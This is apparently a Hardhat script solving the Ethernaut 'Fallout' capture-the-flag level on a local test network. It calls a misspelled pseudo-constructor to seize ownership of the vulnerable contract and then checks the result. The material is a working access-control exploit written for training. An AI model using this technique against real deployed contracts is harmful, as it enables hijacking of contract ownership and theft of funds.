const {ethers} = require('hardhat');

const CTRT_ADDR = "0x9bd03768a7DCc129555dE410FF8E85528A4F88b5"
const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"

async function main() {
  const player = await ethers.getSigner(PLAYER_ADDR);
  const contract = await ethers.getContractAt(
    "Fallout",
    CTRT_ADDR,
    player
  );

  console.log("--[1] call Fal1out")
  await contract.Fal1out();

  console.log("++[2] check")
  let owner = await contract.owner()
  if (owner === player.address) {
    console.log("++[2] DONE");
  }

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
